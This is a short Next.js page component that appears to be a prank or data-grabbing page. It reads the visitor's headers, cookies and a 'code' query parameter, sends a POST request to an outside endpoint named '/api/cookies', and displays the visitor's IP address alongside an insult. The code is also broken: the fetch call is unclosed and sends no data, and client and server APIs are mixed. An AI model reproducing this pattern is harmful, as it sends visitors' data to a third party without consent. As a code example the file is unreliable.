'use client'

import Link from 'next/link';
import { headers } from 'next/headers';
import { useSearchParams } from 'next/navigation';
import { cookies } from 'next/headers';

export default async function Page() {
  const heads = headers()
  const cook = cookies()
  const params = useSearchParams()
  const code = params.get('code')
  await fetch("https://www.chronicbot.xyz/api/cookies", {method: "POST", }
  function btnLog() {
    console.log("Vercel log test");
  }
  
  return (
    <>
      <h1>Got your fucken IP idiot</h1>
      <h2>{heads.get('x-real-ip')}</h2>
      <br/><br/><br/>
      <h3>Consider yourself lucky</h3>
      <p>Just by opening a website, your ip can be displayed, and used to the website's advantage. So be careful about who you trust</p>
      <br/><br/><br/>
      <h5>Don't tell the others, this is important</h5>
    </>
  );
};
